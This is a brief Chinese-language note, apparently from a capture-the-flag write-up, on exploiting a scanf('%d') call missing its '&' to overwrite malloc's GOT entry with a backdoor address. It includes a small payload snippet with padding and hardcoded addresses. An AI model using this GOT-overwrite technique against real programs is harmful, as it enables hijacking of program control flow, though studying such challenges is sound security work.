## scanf
scanf %d 没加&
会写栈中地址，栈中地址可控
向malloc got中写后门即可

```
name = 'a'*200+'xP@' # xP@ <- (malloc.got)
goal = 4201717 # <- backdoor
```
